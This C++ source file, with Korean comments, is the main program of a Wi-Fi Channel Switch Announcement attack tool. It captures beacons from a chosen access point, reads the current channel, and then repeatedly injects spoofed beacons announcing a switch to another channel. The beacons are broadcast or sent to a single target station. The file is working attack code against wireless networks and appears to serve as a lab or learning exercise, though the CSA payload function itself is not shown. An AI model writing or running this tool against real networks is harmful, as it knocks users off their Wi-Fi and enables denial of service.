#include <iostream>
#include <pcap.h>
#include <sstream>
#include <vector>
#include <cstring>
#include "Dot11.h"
#include "MacAddr.h"
#include "csa_attack.h"

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "Usage: " << argv[0] << " <interface> <AP_MAC> [Station_MAC]" << std::endl;
        return 1;
    }
    char* iface = argv[1];
    const char* ap_mac_str = argv[2];
    const char* station_mac_str = (argc >= 4 ? argv[3] : nullptr);

    // 모니터 모드 인터페이스 열기
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap_handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
    if (!pcap_handle) {
        std::cerr << "pcap_open_live(" << iface << ") failed: " << errbuf << std::endl;
        return 1;
    }

    // AP MAC 파싱
    uint8_t ap_mac[6];
    if (!parseMac(ap_mac_str, ap_mac)) {
        std::cerr << "Invalid AP MAC address format." << std::endl;
        return 1;
    }

    // Station MAC (옵션)
    uint8_t station_mac[6];
    bool use_unicast = false;
    if (station_mac_str) {
        if (!parseMac(station_mac_str, station_mac)) {
            std::cerr << "Invalid Station MAC address format." << std::endl;
            return 1;
        }
        use_unicast = true;
    }

    std::cout << "Listening for beacons from AP " << ap_mac_str 
              << " on interface " << iface << "...\n";

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap_handle, &header, &packet);
        if (res == 0) continue; // 타임아웃
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            std::cerr << "pcap_next_ex error: " << pcap_geterr(pcap_handle) << std::endl;
            break;
        }

        // 라디오탭 + 802.11
        size_t full_packet_len = header->caplen;
        if (full_packet_len < sizeof(ieee80211_radiotap_header))
            continue;

        auto* rhdr = reinterpret_cast<const ieee80211_radiotap_header*>(packet);
        int radiotap_len = rhdr->it_len;
        if (full_packet_len < radiotap_len + sizeof(ieee80211_header) + sizeof(beacon_frame_fixed))
            continue;

        const u_char* ieee80211_frame = packet + radiotap_len;
        if (ieee80211_frame[0] != 0x80) // 비콘 = 0x80
            continue;

        // AP BSSID check
        auto* dot11 = reinterpret_cast<const ieee80211_header*>(ieee80211_frame);
        if (std::memcmp(dot11->sourceaddr4, ap_mac, 6) != 0) 
            continue;

        std::cout << "Captured beacon from target AP. Launching CSA attack...\n";

        // IE offset
        int ie_offset = radiotap_len + sizeof(ieee80211_header) + sizeof(beacon_frame_fixed);
        if (ie_offset >= static_cast<int>(full_packet_len)) 
            continue;

        // DS Parameter Set IE (ID=3)
        uint8_t current_channel = 0;
        size_t off = ie_offset;
        while (off < full_packet_len) {
            if (off + 2 > full_packet_len) break;
            auto* ie = reinterpret_cast<const info_element*>(packet + off);
            if (off + 2 + ie->length > full_packet_len) break;

            if (ie->id == 3 && ie->length == 1) {
                current_channel = ie->data[0];
                break;
            }
            off += 2 + ie->length;
        }
        if (current_channel == 0)
            current_channel = 1;

        uint8_t new_channel = static_cast<uint8_t>(current_channel);
        if (new_channel == current_channel || new_channel == 0)
            new_channel = (current_channel == 6 ? 11 : 6);
        // uint8_t new_channel = 6;

        // 전송용 pcap handle 다시 열기(필요에 따라)
        pcap_t* send_handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
        if (!send_handle) {
            std::cerr << "Failed to open send handle: " << errbuf << std::endl;
            break;
        }

        if (use_unicast) {
            // 목적지 MAC 수정
            std::vector<u_char> beacon_buf(full_packet_len);
            std::memcpy(beacon_buf.data(), packet, full_packet_len);

            auto* mod_hdr = reinterpret_cast<ieee80211_header*>(beacon_buf.data() + radiotap_len);
            std::memcpy(mod_hdr->desaddr, station_mac, 6);

            send_beacon_with_csa(send_handle,
                                 beacon_buf.data(),
                                 beacon_buf.size(),
                                 ie_offset,
                                 new_channel);
        } else {
            // Broadcast
            send_beacon_with_csa(send_handle,
                                 packet,
                                 full_packet_len,
                                 ie_offset,
                                 new_channel);
        }

        pcap_close(send_handle);
        // send_beacon_with_csa()가 무한루프이므로 도달 안 할 수 있음
        break;
    }

    pcap_close(pcap_handle);
    return 0;
}
